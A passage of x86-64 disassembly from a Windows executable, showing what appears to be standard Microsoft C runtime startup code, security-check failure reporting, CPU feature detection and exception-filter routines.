   140004148:	48 83 c4 28          	add    $0x28,%rsp
   14000414c:	e9 a1 09 00 00       	jmp    0x140004af2
   140004151:	cc                   	int3
   140004152:	cc                   	int3
   140004153:	cc                   	int3
   140004154:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004159:	57                   	push   %rdi
   14000415a:	48 83 ec 30          	sub    $0x30,%rsp
   14000415e:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004163:	e8 d0 fc ff ff       	call   0x140003e38
   140004168:	84 c0                	test   %al,%al
   14000416a:	0f 84 30 01 00 00    	je     0x1400042a0
   140004170:	40 32 ff             	xor    %dil,%dil
   140004173:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140004178:	e8 7f fc ff ff       	call   0x140003dfc
   14000417d:	8a d8                	mov    %al,%bl
   14000417f:	8b 0d db 3f 00 00    	mov    0x3fdb(%rip),%ecx        # 0x140008160
   140004185:	83 f9 01             	cmp    $0x1,%ecx
   140004188:	0f 84 1d 01 00 00    	je     0x1400042ab
   14000418e:	85 c9                	test   %ecx,%ecx
   140004190:	75 4a                	jne    0x1400041dc
   140004192:	c7 05 c4 3f 00 00 01 	movl   $0x1,0x3fc4(%rip)        # 0x140008160
   140004199:	00 00 00 
   14000419c:	48 8d 15 65 11 00 00 	lea    0x1165(%rip),%rdx        # 0x140005308
   1400041a3:	48 8d 0d 46 11 00 00 	lea    0x1146(%rip),%rcx        # 0x1400052f0
   1400041aa:	e8 19 09 00 00       	call   0x140004ac8
   1400041af:	85 c0                	test   %eax,%eax
   1400041b1:	74 0a                	je     0x1400041bd
   1400041b3:	b8 ff 00 00 00       	mov    $0xff,%eax
   1400041b8:	e9 d8 00 00 00       	jmp    0x140004295
   1400041bd:	48 8d 15 24 11 00 00 	lea    0x1124(%rip),%rdx        # 0x1400052e8
   1400041c4:	48 8d 0d 05 11 00 00 	lea    0x1105(%rip),%rcx        # 0x1400052d0
   1400041cb:	e8 f2 08 00 00       	call   0x140004ac2
   1400041d0:	c7 05 86 3f 00 00 02 	movl   $0x2,0x3f86(%rip)        # 0x140008160
   1400041d7:	00 00 00 
   1400041da:	eb 08                	jmp    0x1400041e4
   1400041dc:	40 b7 01             	mov    $0x1,%dil
   1400041df:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   1400041e4:	8a cb                	mov    %bl,%cl
   1400041e6:	e8 ad fd ff ff       	call   0x140003f98
   1400041eb:	e8 cc 07 00 00       	call   0x1400049bc
   1400041f0:	48 8b d8             	mov    %rax,%rbx
   1400041f3:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400041f7:	74 1e                	je     0x140004217
   1400041f9:	48 8b c8             	mov    %rax,%rcx
   1400041fc:	e8 ff fc ff ff       	call   0x140003f00
   140004201:	84 c0                	test   %al,%al
   140004203:	74 12                	je     0x140004217
   140004205:	45 33 c0             	xor    %r8d,%r8d
   140004208:	41 8d 50 02          	lea    0x2(%r8),%edx
   14000420c:	33 c9                	xor    %ecx,%ecx
   14000420e:	48 8b 03             	mov    (%rbx),%rax
   140004211:	ff 15 91 10 00 00    	call   *0x1091(%rip)        # 0x1400052a8
   140004217:	e8 a8 07 00 00       	call   0x1400049c4
   14000421c:	48 8b d8             	mov    %rax,%rbx
   14000421f:	48 83 38 00          	cmpq   $0x0,(%rax)
   140004223:	74 14                	je     0x140004239
   140004225:	48 8b c8             	mov    %rax,%rcx
   140004228:	e8 d3 fc ff ff       	call   0x140003f00
   14000422d:	84 c0                	test   %al,%al
   14000422f:	74 08                	je     0x140004239
   140004231:	48 8b 0b             	mov    (%rbx),%rcx
   140004234:	e8 ad 08 00 00       	call   0x140004ae6
   140004239:	e8 6a 05 00 00       	call   0x1400047a8
   14000423e:	0f b7 d8             	movzwl %ax,%ebx
   140004241:	e8 76 08 00 00       	call   0x140004abc
   140004246:	44 8b cb             	mov    %ebx,%r9d
   140004249:	4c 8b c0             	mov    %rax,%r8
   14000424c:	33 d2                	xor    %edx,%edx
   14000424e:	48 8d 0d ab bd ff ff 	lea    -0x4255(%rip),%rcx        # 0x140000000
   140004255:	e8 26 e9 ff ff       	call   0x140002b80
   14000425a:	8b d8                	mov    %eax,%ebx
   14000425c:	e8 8f 05 00 00       	call   0x1400047f0
   140004261:	84 c0                	test   %al,%al
   140004263:	74 50                	je     0x1400042b5
   140004265:	40 84 ff             	test   %dil,%dil
   140004268:	75 05                	jne    0x14000426f
   14000426a:	e8 35 08 00 00       	call   0x140004aa4
   14000426f:	33 d2                	xor    %edx,%edx
   140004271:	b1 01                	mov    $0x1,%cl
   140004273:	e8 44 fd ff ff       	call   0x140003fbc
   140004278:	8b c3                	mov    %ebx,%eax
   14000427a:	eb 19                	jmp    0x140004295
   14000427c:	8b d8                	mov    %eax,%ebx
   14000427e:	e8 6d 05 00 00       	call   0x1400047f0
   140004283:	84 c0                	test   %al,%al
   140004285:	74 36                	je     0x1400042bd
   140004287:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   14000428c:	75 05                	jne    0x140004293
   14000428e:	e8 4d 08 00 00       	call   0x140004ae0
   140004293:	8b c3                	mov    %ebx,%eax
   140004295:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000429a:	48 83 c4 30          	add    $0x30,%rsp
   14000429e:	5f                   	pop    %rdi
   14000429f:	c3                   	ret
   1400042a0:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400042a5:	e8 b6 03 00 00       	call   0x140004660
   1400042aa:	90                   	nop
   1400042ab:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400042b0:	e8 ab 03 00 00       	call   0x140004660
   1400042b5:	8b cb                	mov    %ebx,%ecx
   1400042b7:	e8 12 08 00 00       	call   0x140004ace
   1400042bc:	90                   	nop
   1400042bd:	8b cb                	mov    %ebx,%ecx
   1400042bf:	e8 10 08 00 00       	call   0x140004ad4
   1400042c4:	90                   	nop
   1400042c5:	cc                   	int3
   1400042c6:	cc                   	int3
   1400042c7:	cc                   	int3
   1400042c8:	48 83 ec 28          	sub    $0x28,%rsp
   1400042cc:	e8 eb 05 00 00       	call   0x1400048bc
   1400042d1:	48 83 c4 28          	add    $0x28,%rsp
   1400042d5:	e9 7a fe ff ff       	jmp    0x140004154
   1400042da:	cc                   	int3
   1400042db:	cc                   	int3
   1400042dc:	40 53                	rex push %rbx
   1400042de:	48 83 ec 20          	sub    $0x20,%rsp
   1400042e2:	48 8b d9             	mov    %rcx,%rbx
   1400042e5:	33 c9                	xor    %ecx,%ecx
   1400042e7:	ff 15 7b 0d 00 00    	call   *0xd7b(%rip)        # 0x140005068
   1400042ed:	48 8b cb             	mov    %rbx,%rcx
   1400042f0:	ff 15 6a 0d 00 00    	call   *0xd6a(%rip)        # 0x140005060
   1400042f6:	ff 15 74 0d 00 00    	call   *0xd74(%rip)        # 0x140005070
   1400042fc:	48 8b c8             	mov    %rax,%rcx
   1400042ff:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140004304:	48 83 c4 20          	add    $0x20,%rsp
   140004308:	5b                   	pop    %rbx
   140004309:	48 ff 25 68 0d 00 00 	rex.W jmp *0xd68(%rip)        # 0x140005078
   140004310:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004315:	48 83 ec 38          	sub    $0x38,%rsp
   140004319:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000431e:	ff 15 5c 0d 00 00    	call   *0xd5c(%rip)        # 0x140005080
   140004324:	85 c0                	test   %eax,%eax
   140004326:	74 07                	je     0x14000432f
   140004328:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000432d:	cd 29                	int    $0x29
   14000432f:	48 8d 0d 1a 3f 00 00 	lea    0x3f1a(%rip),%rcx        # 0x140008250
   140004336:	e8 a9 00 00 00       	call   0x1400043e4
   14000433b:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140004340:	48 89 05 01 40 00 00 	mov    %rax,0x4001(%rip)        # 0x140008348
   140004347:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   14000434c:	48 83 c0 08          	add    $0x8,%rax
   140004350:	48 89 05 91 3f 00 00 	mov    %rax,0x3f91(%rip)        # 0x1400082e8
   140004357:	48 8b 05 ea 3f 00 00 	mov    0x3fea(%rip),%rax        # 0x140008348
   14000435e:	48 89 05 5b 3e 00 00 	mov    %rax,0x3e5b(%rip)        # 0x1400081c0
   140004365:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000436a:	48 89 05 5f 3f 00 00 	mov    %rax,0x3f5f(%rip)        # 0x1400082d0
   140004371:	c7 05 35 3e 00 00 09 	movl   $0xc0000409,0x3e35(%rip)        # 0x1400081b0
   140004378:	04 00 c0 
   14000437b:	c7 05 2f 3e 00 00 01 	movl   $0x1,0x3e2f(%rip)        # 0x1400081b4
   140004382:	00 00 00 
   140004385:	c7 05 39 3e 00 00 01 	movl   $0x1,0x3e39(%rip)        # 0x1400081c8
   14000438c:	00 00 00 
   14000438f:	b8 08 00 00 00       	mov    $0x8,%eax
   140004394:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140004398:	48 8d 0d 31 3e 00 00 	lea    0x3e31(%rip),%rcx        # 0x1400081d0
   14000439f:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1400043a6:	00 
   1400043a7:	b8 08 00 00 00       	mov    $0x8,%eax
   1400043ac:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400043b0:	48 8b 0d 89 3c 00 00 	mov    0x3c89(%rip),%rcx        # 0x140008040
   1400043b7:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400043bc:	b8 08 00 00 00       	mov    $0x8,%eax
   1400043c1:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1400043c5:	48 8b 0d b4 3c 00 00 	mov    0x3cb4(%rip),%rcx        # 0x140008080
   1400043cc:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400043d1:	48 8d 0d 78 0f 00 00 	lea    0xf78(%rip),%rcx        # 0x140005350
   1400043d8:	e8 ff fe ff ff       	call   0x1400042dc
   1400043dd:	48 83 c4 38          	add    $0x38,%rsp
   1400043e1:	c3                   	ret
   1400043e2:	cc                   	int3
   1400043e3:	cc                   	int3
   1400043e4:	40 53                	rex push %rbx
   1400043e6:	56                   	push   %rsi
   1400043e7:	57                   	push   %rdi
   1400043e8:	48 83 ec 40          	sub    $0x40,%rsp
   1400043ec:	48 8b d9             	mov    %rcx,%rbx
   1400043ef:	ff 15 d3 0c 00 00    	call   *0xcd3(%rip)        # 0x1400050c8
   1400043f5:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   1400043fc:	33 ff                	xor    %edi,%edi
   1400043fe:	45 33 c0             	xor    %r8d,%r8d
   140004401:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140004406:	48 8b ce             	mov    %rsi,%rcx
   140004409:	ff 15 21 0c 00 00    	call   *0xc21(%rip)        # 0x140005030
   14000440f:	48 85 c0             	test   %rax,%rax
   140004412:	74 39                	je     0x14000444d
   140004414:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000441a:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000441f:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140004424:	4c 8b c8             	mov    %rax,%r9
   140004427:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000442c:	4c 8b c6             	mov    %rsi,%r8
   14000442f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004434:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004439:	33 c9                	xor    %ecx,%ecx
   14000443b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140004440:	ff 15 12 0c 00 00    	call   *0xc12(%rip)        # 0x140005058
   140004446:	ff c7                	inc    %edi
   140004448:	83 ff 02             	cmp    $0x2,%edi
   14000444b:	7c b1                	jl     0x1400043fe
   14000444d:	48 83 c4 40          	add    $0x40,%rsp
   140004451:	5f                   	pop    %rdi
   140004452:	5e                   	pop    %rsi
   140004453:	5b                   	pop    %rbx
   140004454:	c3                   	ret
   140004455:	cc                   	int3
   140004456:	cc                   	int3
   140004457:	cc                   	int3
   140004458:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   14000445d:	48 8d 05 2c 0f 00 00 	lea    0xf2c(%rip),%rax        # 0x140005390
   140004464:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140004468:	48 8d 05 11 0f 00 00 	lea    0xf11(%rip),%rax        # 0x140005380
   14000446f:	48 89 01             	mov    %rax,(%rcx)
   140004472:	48 8b c1             	mov    %rcx,%rax
   140004475:	c3                   	ret
   140004476:	cc                   	int3
   140004477:	cc                   	int3
   140004478:	48 83 ec 48          	sub    $0x48,%rsp
   14000447c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004481:	e8 d2 ff ff ff       	call   0x140004458
   140004486:	48 8d 15 bb 22 00 00 	lea    0x22bb(%rip),%rdx        # 0x140006748
   14000448d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004492:	e8 cb 05 00 00       	call   0x140004a62
   140004497:	cc                   	int3
   140004498:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000449d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400044a2:	57                   	push   %rdi
   1400044a3:	48 83 ec 10          	sub    $0x10,%rsp
   1400044a7:	33 c0                	xor    %eax,%eax
   1400044a9:	33 c9                	xor    %ecx,%ecx
   1400044ab:	0f a2                	cpuid
   1400044ad:	44 8b c1             	mov    %ecx,%r8d
   1400044b0:	45 33 db             	xor    %r11d,%r11d
   1400044b3:	44 8b d2             	mov    %edx,%r10d
   1400044b6:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   1400044bd:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   1400044c4:	44 8b cb             	mov    %ebx,%r9d
   1400044c7:	8b f0                	mov    %eax,%esi
   1400044c9:	33 c9                	xor    %ecx,%ecx
   1400044cb:	41 8d 43 01          	lea    0x1(%r11),%eax
   1400044cf:	45 0b d0             	or     %r8d,%r10d
   1400044d2:	0f a2                	cpuid
   1400044d4:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   1400044db:	89 04 24             	mov    %eax,(%rsp)
   1400044de:	45 0b d1             	or     %r9d,%r10d
   1400044e1:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   1400044e5:	8b f9                	mov    %ecx,%edi
   1400044e7:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400044eb:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   1400044ef:	75 5b                	jne    0x14000454c
   1400044f1:	48 83 0d 9f 3b 00 00 	orq    $0xffffffffffffffff,0x3b9f(%rip)        # 0x140008098
   1400044f8:	ff 
   1400044f9:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   1400044fe:	48 c7 05 87 3b 00 00 	movq   $0x8000,0x3b87(%rip)        # 0x140008090
   140004505:	00 80 00 00 
   140004509:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   14000450e:	74 28                	je     0x140004538
   140004510:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140004515:	74 21                	je     0x140004538
   140004517:	3d 70 06 02 00       	cmp    $0x20670,%eax
   14000451c:	74 1a                	je     0x140004538
   14000451e:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140004523:	83 f8 20             	cmp    $0x20,%eax
   140004526:	77 24                	ja     0x14000454c
   140004528:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   14000452f:	00 00 00 
   140004532:	48 0f a3 c1          	bt     %rax,%rcx
   140004536:	73 14                	jae    0x14000454c
   140004538:	44 8b 05 e1 41 00 00 	mov    0x41e1(%rip),%r8d        # 0x140008720
   14000453f:	41 83 c8 01          	or     $0x1,%r8d
   140004543:	44 89 05 d6 41 00 00 	mov    %r8d,0x41d6(%rip)        # 0x140008720
   14000454a:	eb 07                	jmp    0x140004553
   14000454c:	44 8b 05 cd 41 00 00 	mov    0x41cd(%rip),%r8d        # 0x140008720
   140004553:	b8 07 00 00 00       	mov    $0x7,%eax
   140004558:	44 8d 48 fb          	lea    -0x5(%rax),%r9d
   14000455c:	3b f0                	cmp    %eax,%esi
   14000455e:	7c 26                	jl     0x140004586
   140004560:	33 c9                	xor    %ecx,%ecx
   140004562:	0f a2                	cpuid
   140004564:	89 04 24             	mov    %eax,(%rsp)
   140004567:	44 8b db             	mov    %ebx,%r11d
   14000456a:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   14000456e:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140004572:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   140004576:	0f ba e3 09          	bt     $0x9,%ebx
   14000457a:	73 0a                	jae    0x140004586
   14000457c:	45 0b c1             	or     %r9d,%r8d
   14000457f:	44 89 05 9a 41 00 00 	mov    %r8d,0x419a(%rip)        # 0x140008720
   140004586:	c7 05 f8 3a 00 00 01 	movl   $0x1,0x3af8(%rip)        # 0x140008088
   14000458d:	00 00 00 
   140004590:	44 89 0d f5 3a 00 00 	mov    %r9d,0x3af5(%rip)        # 0x14000808c
   140004597:	0f ba e7 14          	bt     $0x14,%edi
   14000459b:	0f 83 91 00 00 00    	jae    0x140004632
   1400045a1:	44 89 0d e0 3a 00 00 	mov    %r9d,0x3ae0(%rip)        # 0x140008088
   1400045a8:	bb 06 00 00 00       	mov    $0x6,%ebx
   1400045ad:	89 1d d9 3a 00 00    	mov    %ebx,0x3ad9(%rip)        # 0x14000808c
   1400045b3:	0f ba e7 1b          	bt     $0x1b,%edi
   1400045b7:	73 79                	jae    0x140004632
   1400045b9:	0f ba e7 1c          	bt     $0x1c,%edi
   1400045bd:	73 73                	jae    0x140004632
   1400045bf:	33 c9                	xor    %ecx,%ecx
   1400045c1:	0f 01 d0             	xgetbv
   1400045c4:	48 c1 e2 20          	shl    $0x20,%rdx
   1400045c8:	48 0b d0             	or     %rax,%rdx
   1400045cb:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400045d0:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400045d5:	22 c3                	and    %bl,%al
   1400045d7:	3a c3                	cmp    %bl,%al
   1400045d9:	75 57                	jne    0x140004632
   1400045db:	8b 05 ab 3a 00 00    	mov    0x3aab(%rip),%eax        # 0x14000808c
   1400045e1:	83 c8 08             	or     $0x8,%eax
   1400045e4:	c7 05 9a 3a 00 00 03 	movl   $0x3,0x3a9a(%rip)        # 0x140008088
   1400045eb:	00 00 00 
   1400045ee:	89 05 98 3a 00 00    	mov    %eax,0x3a98(%rip)        # 0x14000808c
   1400045f4:	41 f6 c3 20          	test   $0x20,%r11b
   1400045f8:	74 38                	je     0x140004632
   1400045fa:	83 c8 20             	or     $0x20,%eax
   1400045fd:	c7 05 81 3a 00 00 05 	movl   $0x5,0x3a81(%rip)        # 0x140008088
   140004604:	00 00 00 
   140004607:	89 05 7f 3a 00 00    	mov    %eax,0x3a7f(%rip)        # 0x14000808c
   14000460d:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
   140004612:	44 23 d8             	and    %eax,%r11d
   140004615:	44 3b d8             	cmp    %eax,%r11d
   140004618:	75 18                	jne    0x140004632
   14000461a:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000461f:	24 e0                	and    $0xe0,%al
   140004621:	3c e0                	cmp    $0xe0,%al
   140004623:	75 0d                	jne    0x140004632
   140004625:	83 0d 60 3a 00 00 40 	orl    $0x40,0x3a60(%rip)        # 0x14000808c
   14000462c:	89 1d 56 3a 00 00    	mov    %ebx,0x3a56(%rip)        # 0x140008088
   140004632:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140004637:	33 c0                	xor    %eax,%eax
   140004639:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   14000463e:	48 83 c4 10          	add    $0x10,%rsp
   140004642:	5f                   	pop    %rdi
   140004643:	c3                   	ret
   140004644:	b8 01 00 00 00       	mov    $0x1,%eax
   140004649:	c3                   	ret
   14000464a:	cc                   	int3
   14000464b:	cc                   	int3
   14000464c:	33 c0                	xor    %eax,%eax
   14000464e:	39 05 5c 3a 00 00    	cmp    %eax,0x3a5c(%rip)        # 0x1400080b0
   140004654:	0f 95 c0             	setne  %al
   140004657:	c3                   	ret
   140004658:	83 25 c5 40 00 00 00 	andl   $0x0,0x40c5(%rip)        # 0x140008724
   14000465f:	c3                   	ret
   140004660:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004665:	55                   	push   %rbp
   140004666:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   14000466d:	ff 
   14000466e:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   140004675:	8b d9                	mov    %ecx,%ebx
   140004677:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000467c:	ff 15 fe 09 00 00    	call   *0x9fe(%rip)        # 0x140005080
   140004682:	85 c0                	test   %eax,%eax
   140004684:	74 04                	je     0x14000468a
   140004686:	8b cb                	mov    %ebx,%ecx
   140004688:	cd 29                	int    $0x29
   14000468a:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000468f:	e8 c4 ff ff ff       	call   0x140004658
   140004694:	33 d2                	xor    %edx,%edx
   140004696:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000469a:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   1400046a0:	e8 cf 03 00 00       	call   0x140004a74
   1400046a5:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400046a9:	ff 15 19 0a 00 00    	call   *0xa19(%rip)        # 0x1400050c8
   1400046af:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   1400046b6:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   1400046bd:	48 8b cb             	mov    %rbx,%rcx
   1400046c0:	45 33 c0             	xor    %r8d,%r8d
   1400046c3:	ff 15 67 09 00 00    	call   *0x967(%rip)        # 0x140005030
   1400046c9:	48 85 c0             	test   %rax,%rax
   1400046cc:	74 3c                	je     0x14000470a
   1400046ce:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400046d4:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   1400046db:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   1400046e2:	4c 8b c8             	mov    %rax,%r9
   1400046e5:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400046ea:	4c 8b c3             	mov    %rbx,%r8
   1400046ed:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   1400046f4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400046f9:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400046fd:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004702:	33 c9                	xor    %ecx,%ecx
   140004704:	ff 15 4e 09 00 00    	call   *0x94e(%rip)        # 0x140005058
   14000470a:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140004711:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004716:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   14000471d:	33 d2                	xor    %edx,%edx
   14000471f:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   140004726:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   14000472c:	48 83 c0 08          	add    $0x8,%rax
   140004730:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140004737:	e8 38 03 00 00       	call   0x140004a74
   14000473c:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140004743:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140004748:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   14000474f:	40 
   140004750:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140004757:	00 
   140004758:	ff 15 2a 09 00 00    	call   *0x92a(%rip)        # 0x140005088
   14000475e:	8b d8                	mov    %eax,%ebx
   140004760:	33 c9                	xor    %ecx,%ecx
   140004762:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140004767:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000476c:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140004770:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004775:	ff 15 ed 08 00 00    	call   *0x8ed(%rip)        # 0x140005068
   14000477b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004780:	ff 15 da 08 00 00    	call   *0x8da(%rip)        # 0x140005060
   140004786:	85 c0                	test   %eax,%eax
   140004788:	75 0d                	jne    0x140004797
   14000478a:	83 fb 01             	cmp    $0x1,%ebx
   14000478d:	74 08                	je     0x140004797
   14000478f:	8d 48 03             	lea    0x3(%rax),%ecx
   140004792:	e8 c1 fe ff ff       	call   0x140004658
   140004797:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   14000479e:	00 
   14000479f:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   1400047a6:	5d                   	pop    %rbp
   1400047a7:	c3                   	ret
   1400047a8:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   1400047af:	33 d2                	xor    %edx,%edx
   1400047b1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400047b6:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   1400047ba:	e8 b5 02 00 00       	call   0x140004a74
   1400047bf:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400047c4:	ff 15 c6 08 00 00    	call   *0x8c6(%rip)        # 0x140005090
   1400047ca:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   1400047cf:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400047d4:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   1400047da:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   1400047e1:	c3                   	ret
   1400047e2:	cc                   	int3
   1400047e3:	cc                   	int3
   1400047e4:	e9 03 00 00 00       	jmp    0x1400047ec
   1400047e9:	cc                   	int3
   1400047ea:	cc                   	int3
   1400047eb:	cc                   	int3
   1400047ec:	33 c0                	xor    %eax,%eax
   1400047ee:	c3                   	ret
   1400047ef:	cc                   	int3
   1400047f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400047f4:	33 c9                	xor    %ecx,%ecx
   1400047f6:	ff 15 9c 08 00 00    	call   *0x89c(%rip)        # 0x140005098
   1400047fc:	48 85 c0             	test   %rax,%rax
   1400047ff:	74 39                	je     0x14000483a
   140004801:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140004806:	66 39 08             	cmp    %cx,(%rax)
   140004809:	75 2f                	jne    0x14000483a
   14000480b:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000480f:	48 03 c8             	add    %rax,%rcx
   140004812:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140004818:	75 20                	jne    0x14000483a
   14000481a:	b8 0b 02 00 00       	mov    $0x20b,%eax
   14000481f:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140004823:	75 15                	jne    0x14000483a
   140004825:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   14000482c:	76 0c                	jbe    0x14000483a
   14000482e:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   140004835:	0f 95 c0             	setne  %al
   140004838:	eb 02                	jmp    0x14000483c
   14000483a:	32 c0                	xor    %al,%al
   14000483c:	48 83 c4 28          	add    $0x28,%rsp
   140004840:	c3                   	ret
   140004841:	cc                   	int3
   140004842:	cc                   	int3
   140004843:	cc                   	int3
   140004844:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140004854
   14000484b:	48 ff 25 16 08 00 00 	rex.W jmp *0x816(%rip)        # 0x140005068
   140004852:	cc                   	int3
   140004853:	cc                   	int3
   140004854:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004859:	57                   	push   %rdi
   14000485a:	48 83 ec 20          	sub    $0x20,%rsp
   14000485e:	48 8b 19             	mov    (%rcx),%rbx
   140004861:	48 8b f9             	mov    %rcx,%rdi
   140004864:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000486a:	75 1c                	jne    0x140004888
   14000486c:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140004870:	75 16                	jne    0x140004888
   140004872:	8b 53 20             	mov    0x20(%rbx),%edx
   140004875:	8d 82 e0 fa 6c e6    	lea    -0x19930520(%rdx),%eax
   14000487b:	83 f8 02             	cmp    $0x2,%eax
   14000487e:	76 15                	jbe    0x140004895
   140004880:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140004886:	74 0d                	je     0x140004895
   140004888:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000488d:	33 c0                	xor    %eax,%eax
   14000488f:	48 83 c4 20          	add    $0x20,%rsp
   140004893:	5f                   	pop    %rdi
   140004894:	c3                   	ret
   140004895:	e8 ce 01 00 00       	call   0x140004a68
   14000489a:	48 89 18             	mov    %rbx,(%rax)
   14000489d:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   1400048a1:	e8 c8 01 00 00       	call   0x140004a6e
   1400048a6:	48 89 18             	mov    %rbx,(%rax)
   1400048a9:	e8 50 02 00 00       	call   0x140004afe
   1400048ae:	cc                   	int3
   1400048af:	cc                   	int3
   1400048b0:	c2 00 00             	ret    $0x0
   1400048b3:	cc                   	int3
   1400048b4:	e9 4b 02 00 00       	jmp    0x140004b04
